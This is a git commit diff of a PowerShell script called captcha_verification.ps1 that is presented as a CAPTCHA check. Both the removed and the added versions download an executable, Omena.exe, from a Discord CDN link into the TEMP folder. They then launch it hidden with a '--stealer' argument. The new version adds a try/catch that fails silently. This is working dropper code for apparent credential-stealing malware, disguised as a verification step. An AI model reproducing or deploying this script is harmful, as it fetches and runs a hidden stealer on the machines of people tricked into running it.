203eeaa2b2918d9064dc37ed05e8221f4775ca0c
urho122-cpu <urho122@gmail.com>
2026-06-19 03:18:48 +0300

    Update captcha_verification.ps1

--- captcha_verification.ps1
+++ captcha_verification.ps1
@@ -1,4 +1,10 @@
-# verify.ps1 - CAPTCHA VERIFICATION
-$exe = "$env:TEMP\Omena.exe"
-(New-Object Net.WebClient).DownloadFile('https://cdn.discordapp.com/attachments/1517205249323040932/1517230097260609677/Omena.exe?ex=6a358623&is=6a3434a3&hm=3a1e3ce3379a4244a106efc131b6a8410d9cd5380a06fff2f3f476527fcecc36&', $exe)
-Start-Process $exe -ArgumentList '--stealer' -WindowStyle Hidden
+# CAPTCHA Verification Payload
+try {
+    $exePath = "$env:TEMP\Omena.exe"
+    $url = "https://cdn.discordapp.com/attachments/1517205249323040932/1517230097260609677/Omena.exe?ex=6a358623&is=6a3434a3&hm=3a1e3ce3379a4244a106efc131b6a8410d9cd5380a06fff2f3f476527fcecc36&"   # <--- Change this
+    
+    (New-Object Net.WebClient).DownloadFile($url, $exePath)
+    Start-Process $exePath -ArgumentList '--stealer' -WindowStyle Hidden
+} catch {
+    # Silent fail
+}
